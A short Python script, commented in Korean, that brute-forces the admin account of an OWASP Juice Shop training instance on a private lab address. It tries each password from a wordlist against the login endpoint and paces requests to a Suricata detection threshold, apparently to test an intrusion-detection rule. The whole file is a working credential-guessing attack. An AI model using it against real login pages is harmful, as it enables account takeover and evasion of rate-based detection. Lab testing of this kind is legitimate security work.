import requests
import time

BASE_URL = "http://172.16.20.10:3000"  # ← 실제 Juice Shop IP로 수정

def test_bruteforce():
    print("\n--- [1] Testing Brute-Force ---")
    url = f"{BASE_URL}/rest/user/login"

    # passwords.txt에서 읽어오도록 변경
    with open("passwords.txt", "r") as f:
        passwords = [line.strip() for line in f.readlines()]

    for pw in passwords:
        data = {"email": "admin@juice-sh.op", "password": pw}
        try:
            r = requests.post(url, json=data, headers={
                "Content-Type": "application/json",
                "Origin": "http://172.16.20.10:3000",
                "Referer": "http://172.16.20.10:3000/"
            })
            if "authentication" in r.text and r.status_code == 200:
                print(f"[★ SUCCESS] 비밀번호 발견: {pw}")
                break
            else:
                print(f"[FAIL] {pw} | Status: {r.status_code}")
            time.sleep(0.3)  # Suricata threshold 맞게 조절
        except requests.exceptions.RequestException as e:
            print(f"[ERROR] Connection failed: {e}")
            break

if __name__ == "__main__":
    test_bruteforce()